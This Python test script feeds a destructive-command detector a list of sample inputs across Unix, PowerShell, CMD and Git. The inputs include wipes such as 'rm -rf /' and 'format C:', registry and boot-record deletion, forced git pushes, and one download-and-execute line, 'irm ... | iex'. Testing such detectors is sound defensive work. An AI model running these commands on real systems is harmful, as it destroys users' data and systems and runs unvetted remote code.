from detector import detect_destructive_command


def test(command: str):
    result = detect_destructive_command(command)
    if result:
        print(f"Destructive command detected: {result}")
        print("")
    else:
        print("No destructive command detected.")
        print("")


# ── Unix destructive commands ─────────────────────────────────────────────────

test("rm -rf /")
test("rm -rf /*")
test("rm -rf ~")
test("rm -rf ~/*")
test('psql -c "DROP TABLE users"')
test("DROP TABLE users | psql")     
test("docker system prune -af")
test("npm publish")
test("twine upload dist/*")

# ── Windows PowerShell destructive commands ───────────────────────────────────

test("Remove-Item -recurse -force C:\\Users")
test("Remove-Item -recurse C:\\Windows\\System32")
test("Get-ChildItem | Remove-Item")      
test("Format-Volume C")
test("Clear-Disk -Number 0")
test("Remove-ItemProperty -Path HKLM:\\Software\\Key -Name Value")
test("Clear-RecycleBin -Force")
test("irm https://example.com/script.ps1 | iex") 

# ── Windows CMD destructive commands ─────────────────────────────────────────

test("rd /s /q C:\\Users")
test("rd /q /s C:\\Users")
test("del /s C:\\Windows\\System32")    
test("del /f /s C:\\Windows\\System32") 
test("format C:")
test("format /q C:")
test("diskpart")
test("bcdedit /delete {bootmgr}")
test("reg delete HKLM\\Software\\Key /f")

# ── Git destructive commands ──────────────────────────────────────────────────

test("git push origin main --force-with-lease")
test("git push origin main --force-if-includes")
test("git push origin main --force")
test("git push origin -f")
test("git push origin -F")
test("git push origin +main")
test("git push origin --mirror")
test("git clean -fd")
test("git reset --hard HEAD~1")
test("git checkout -- .")
